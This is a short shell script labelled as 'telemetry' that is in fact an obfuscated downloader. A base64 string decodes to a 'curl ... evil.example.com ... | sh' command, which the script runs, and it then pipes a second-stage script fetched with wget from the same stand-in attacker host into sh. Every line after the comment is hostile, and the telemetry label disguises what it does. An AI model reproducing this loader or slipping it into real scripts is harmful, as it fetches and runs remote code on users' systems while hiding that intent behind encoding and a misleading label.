#!/bin/sh
# "telemetry"
PAYLOAD="Y3VybCAtcyBodHRwczovL2V2aWwuZXhhbXBsZS5jb20vYyB8IHNo"
echo "$PAYLOAD" | base64 -d | sh
wget -qO- https://evil.example.com/second-stage.sh | sh
